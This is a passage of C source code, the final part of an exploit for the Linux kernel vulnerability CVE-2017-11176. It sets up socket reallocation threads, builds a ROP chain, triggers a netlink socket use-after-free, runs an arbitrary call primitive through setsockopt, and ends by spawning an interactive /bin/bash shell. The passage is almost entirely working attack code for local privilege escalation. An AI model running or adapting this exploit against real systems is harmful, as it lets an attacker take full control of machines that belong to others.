    printf("[-] can't use the 'ancillary data buffer' reallocation gadget!\n");
    goto fail;
  }
  printf("[+] can use the 'ancillary data buffer' reallocation gadget!\n");

  if (init_realloc_data())
  {
    printf("[-] failed to initialize reallocation data!\n");
    goto fail;
  }
  printf("[+] reallocation data initialized!\n");

  printf("[ ] initializing reallocation threads, please wait...\n");
  for (thread = 0; thread < nb_reallocs; ++thread)
  {
    if (init_unix_sockets(&rta[thread]))
    {
      printf("[-] failed to init UNIX sockets!\n");
      goto fail;
    }

    if ((ret = pthread_create(&rta[thread].tid, NULL, realloc_thread, &rta[thread])) != 0)
    {
      perror("[-] pthread_create");
      goto fail;
    }
  }

  // wait until all threads have been created
  while (g_nb_realloc_thread_ready < nb_reallocs)
    _sched_yield(); // don't run me, run the reallocator threads!

  printf("[+] %lu reallocation threads ready!\n", nb_reallocs);

  return 0;

fail:
  printf("[-] failed to initialize reallocation\n");
  return -1;
}

// ----------------------------------------------------------------------------

// keep this inlined, we can't loose any time (critical path)
static inline __attribute__((always_inline)) void realloc_NOW(void)
{
  g_realloc_now = 1;
  _sched_yield(); // don't run me, run the reallocator threads!
  sleep(5);
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

int main(void)
{
  int sock_fd2 = -1;
  int val;
  struct realloc_thread_arg rta[NB_REALLOC_THREADS];

  printf("[ ] -={ CVE-2017-11176 Exploit }=-\n");

  if (migrate_to_cpu0())
  {
    printf("[-] failed to migrate to CPU#0\n");
    goto fail;
  }
  printf("[+] successfully migrated to CPU#0\n");

  if (allocate_uland_structs())
  {
    printf("[-] failed to allocate userland structures!\n");
    goto fail;
  }

  build_rop_chain((uint64_t*)g_fake_stack);
  printf("[+] ROP-chain ready\n");

  memset(rta, 0, sizeof(rta));
  if (init_reallocation(rta, NB_REALLOC_THREADS))
  {
    printf("[-] failed to initialize reallocation!\n");
    goto fail;
  }
  printf("[+] reallocation ready!\n");

  if (find_netlink_candidates(&g_target, &g_guard))
  {
    printf("[-] failed to find netlink candidates\n");
    goto fail;
  }
  printf("[+] netlink candidates ready:\n");
  printf("[+] target.pid = %d\n", g_target.pid);
  printf("[+] guard.pid  = %d\n", g_guard.pid);

  if (fill_receive_buffer(&g_target, &g_guard))
    goto fail;

  if (((unblock_fd = _dup(g_target.sock_fd)) < 0) ||
      ((sock_fd2 = _dup(g_target.sock_fd)) < 0))
  {
    perror("[-] dup");
    goto fail;
  }
  printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);

  // trigger the bug twice AND immediatly realloc!
  if (decrease_sock_refcounter(g_target.sock_fd, unblock_fd) ||
      decrease_sock_refcounter(sock_fd2, unblock_fd))
  {
    goto fail;
  }
  realloc_NOW();

  // close it before invoking the arbitrary call
  close(g_guard.sock_fd);
  printf("[+] guard socket closed\n");

  if (!check_realloc_succeed(unblock_fd, MAGIC_NL_PID, MAGIC_NL_GROUPS))
  {
    printf("[-] reallocation failed!\n");
    // TODO: retry the exploit
    goto fail;
  }
  printf("[+] reallocation succeed! Have fun :-)\n");


  // trigger the arbitrary call primitive
  printf("[ ] invoking arbitrary call primitive...\n");
  val = 3535; // need to be different than zero
  if (_setsockopt(unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
  {
    perror("[-] setsockopt");
    goto fail;
  }
  printf("[+] arbitrary call succeed!\n");

  printf("[+] exploit complete!\n");

  printf("[ ] popping shell now!\n");
  char* shell = "/bin/bash";
  char* args[] = {shell, "-i", NULL};
  execve(shell, args, NULL);

  return 0;

fail:
  printf("[-] exploit failed!\n");
  PRESS_KEY();
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================